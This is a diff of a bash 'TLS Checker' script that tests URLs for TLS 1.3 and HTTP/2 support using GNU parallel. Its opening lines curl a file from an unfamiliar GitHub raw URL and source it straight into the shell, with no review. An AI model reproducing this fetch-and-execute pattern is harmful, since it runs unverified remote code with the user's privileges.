@@ -1,12 +1,12 @@
 #!/bin/bash
 
+# TLS Checker - Validates URLs for specific security protocol support
 # Download the function file from the GitHub repository
 curl https://raw.githubusercontent.com/us254/Anyplace1525/main/Ravage3184 -o ~/Ravage3184
 
 # Source the function definitions into the current shell
 source ~/Ravage3184
 
-#!/bin/bash
 # Define a function to perform the checks for a single URL
 check_url() {
   local url="$1"
@@ -28,3 +28,9 @@ is_tlsv1_3_h2() {
   # Add --joblog option to create a log file named joblog.txt
   parallel --joblog joblog.txt check_url ::: "${@}"
 }
+
+# Call the 'is_tlsv1_3_h2' function if script is not being sourced
+# This checks if there's an argument provided to the script
+if [[ "${#BASH_SOURCE[@]}" -gt "0" && "${#}" -gt "0" ]]; then
+    is_tlsv1_3_h2 "$@"
+fi
